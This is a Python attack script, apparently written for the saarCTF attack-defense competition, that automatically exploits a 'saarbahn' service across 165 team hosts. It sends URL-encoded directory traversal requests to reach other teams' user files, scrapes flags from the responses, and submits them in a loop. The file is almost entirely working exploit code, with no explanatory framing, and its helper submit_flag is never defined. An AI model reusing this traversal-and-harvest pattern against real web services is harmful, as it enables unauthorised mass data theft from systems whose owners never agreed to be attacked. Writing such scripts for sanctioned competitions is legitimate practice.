#!/usr/bin/env python3
from pwn import *
import re
import time
from typing import Set
import requests
import multiprocessing


NOP_TEAM_ID = 1
OUR_TEAM_ID = 66
SKIPPED_TEAMS = {OUR_TEAM_ID, NOP_TEAM_ID}
NUM_TEAMS = 165

MIN_ATTACK_ITERATION_DURATION = 120     # Duration in seconds an attack iteration should take.
                                        # If we are faster, we wait.

FLAG_SUBMISSION_HOST = "submission.ctf.saarland"
FLAG_SUBMISSION_PORT = 31337
FLAG_REGEX = re.compile(r"SAAR\{[A-Za-z0-9-_]{32}\}")

SERVICE_PORT = 8000                     # TODO adjust to your service
FLAG_STORAGE_NAME = f"saarCTF.{SERVICE_PORT}.flags"
context.log_level = "info"              # Change to "debug" for more output
context.timeout = 5

flag_ids = []

def get_target_vulnbox_ip(target_id: int) -> str:
    return f"10.{32 + target_id // 200}.{target_id % 200}.2"


def is_valid_flag(flag: str) -> bool:
    return FLAG_REGEX.fullmatch(flag) is not None


def attack(target_ip: str) -> Set[str]:
    # TODO implement :)
    # Make sure you use timeouts when connecting to remote services
    log.debug(f"Attacking {target_ip}:{SERVICE_PORT}")

    flagids_local = flag_ids["flag_ids"]["saarbahn"]
    if target_ip not in flagids_local:
        return set()

    flagids_local = flagids_local[target_ip]
    flags_total = set()
    last=len(flagids_local)
    i = 0
    for flagid in flagids_local:
        if i < last - 4:
            i += 1
            continue
        i += 1
        print(flagids_local[flagid])
        flagid = flagids_local[flagid].encode('utf-8')

        import hashlib
        bla = hashlib.sha256(flagid).hexdigest()
        # print(bla)
        resp = requests.get("https://"+target_ip+":8000/stops/%2E%2E%2Fusers%2F" + bla, verify=False, timeout=10)
        flags = re.findall(FLAG_REGEX, resp.text)
        print(flags)
        flags_total = flags_total.union(set(flags))
    return flags_total


def attack_target(target_ip):
    try:
        target_flags = attack(target_ip)
        return target_flags

    except Exception as e:
        log.warning("Something failed, but we go on.", e)


def main():
    submitted_flags = set()

    if os.path.exists(FLAG_STORAGE_NAME):
        with open(FLAG_STORAGE_NAME, "r") as f:
            data = f.read()
        submitted_flags = set(data.split("\n"))
        log.info(f"Loaded {len(submitted_flags)} flags from storage file")
    else:
        log.info("Storage file does not exist, starting from scratch")

    while True:
        attack_iteration_start_time = time.time()
        global flag_ids
        flag_ids = requests.get("https://scoreboard.ctf.saarland/attack.json").json()

        # Iterate over all teams and attack them

        target_ips = []
        for target_id in range(1, NUM_TEAMS + 1):
            if target_id in SKIPPED_TEAMS:
                continue

            target_ips.append(get_target_vulnbox_ip(target_id))

        def chunks(l, n):
            n = max(1, n)
            return (list(l[i:i + n]) for i in range(0, len(l), n))

        for split_target_ips in chunks(target_ips, 6):
            print(split_target_ips)
            flags = []
            with multiprocessing.Pool() as pool:
                for flag_lists in pool.map(attack_target, list(split_target_ips)):
                    if flag_lists is None:
                        continue
                    for f in flag_lists:
                        flags.append(f)

            flags = set(flags)

            num_new_flags_submitted = 0
            to_submit = ""
            for new_flag in (flags - submitted_flags):
                if not is_valid_flag(new_flag):
                    continue

                to_submit += (new_flag) + "\n"
                submitted_flags.add(new_flag)
                num_new_flags_submitted = num_new_flags_submitted + 1

            submission_response = submit_flag(to_submit,
                                              server=FLAG_SUBMISSION_HOST,
                                              port=FLAG_SUBMISSION_PORT).decode()
            log.info(f"Response: {submission_response}")


            if num_new_flags_submitted > 0:
                log.info(f"Submitted {num_new_flags_submitted} new flags, updating flag storage")
                with open(FLAG_STORAGE_NAME, "w") as f:
                    f.write("\n".join(submitted_flags))
            else:
                log.info("No new flags submitted")

        attack_iteration_end_time = time.time()
        attack_iteration_duration = int(attack_iteration_end_time - attack_iteration_start_time)
        log.info(f"Attack iteration took {attack_iteration_duration} seconds")

        if attack_iteration_duration < MIN_ATTACK_ITERATION_DURATION:
            sleep_duration = MIN_ATTACK_ITERATION_DURATION - attack_iteration_duration
            log.info(f"Sleeping {sleep_duration} seconds")
            time.sleep(sleep_duration)


if __name__ == "__main__":
    main()
